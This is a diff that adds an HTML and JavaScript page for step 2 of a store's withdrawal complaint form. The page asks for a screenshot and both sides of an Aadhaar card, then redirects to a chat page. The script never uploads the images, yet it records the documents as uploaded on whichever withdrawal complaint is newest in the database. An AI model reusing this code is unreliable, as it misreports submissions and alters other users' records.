@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdrawal Problem - Step 2</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style3.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="withdrawal.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>WITHDRWAL PROBLEM - STEP 2</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+            <div class="step-title">STEP 2 - DOCUMENTS DETAILS</div>
+
+            <div class="form-group">
+                <label>UPLOAD WITHDRWAL ISSUE IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <div class="form-group">
+                <label>UPLOAD AADHAR CARD FRONT IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <div class="form-group">
+                <label>AADHAR CARD BACK IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <button type="submit" class="submit-btn">COMPLAIN NOW</button>
+        </form>
+    </main>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBAB_nWexO6iW9RGPmfsqXVjhDWpnlSXoU",
+            authDomain: "zenvy-store-43ca0.firebaseapp.com",
+            databaseURL: "https://zenvy-store-43ca0-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "zenvy-store-43ca0",
+            storageBucket: "zenvy-store-43ca0.firebasestorage.app",
+            messagingSenderId: "469849085917",
+            appId: "1:469849085917:web:efe5625260eaa28ab30834"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const uploadAreas = document.querySelectorAll('.upload-area');
+
+        uploadAreas.forEach(area => {
+            const fileInput = area.querySelector('.file-input');
+            const preview = area.nextElementSibling;
+
+            area.addEventListener('click', () => {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    reader.onload = (event) => {
+                        preview.innerHTML = `<img src="${event.target.result}" alt="Preview">`;
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+        });
+
+        const REDIRECT_LINK = '../CHAT/CHAT-PENNAL/index.html';
+
+        document.querySelector('.complain-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const fileInputs = document.querySelectorAll('.file-input');
+            let allUploaded = true;
+            
+            fileInputs.forEach(input => {
+                if (!input.files.length) {
+                    allUploaded = false;
+                    input.closest('.upload-area').style.borderColor = '#ff4444';
+                } else {
+                    input.closest('.upload-area').style.borderColor = '#ddd';
+                }
+            });
+            
+            if (!allUploaded) {
+                alert('Please upload all images!');
+                return;
+            }
+
+            db.ref('complaints/').orderByChild('type').equalTo('withdrawal').limitToLast(1).once('value', (snapshot) => {
+                snapshot.forEach((childSnapshot) => {
+                    db.ref('complaints/' + childSnapshot.key).update({
+                        documents: 'uploaded',
+                        status: 'step2',
+                        timestamp2: Date.now()
+                    });
+                });
+            });
+            
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_LINK;
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
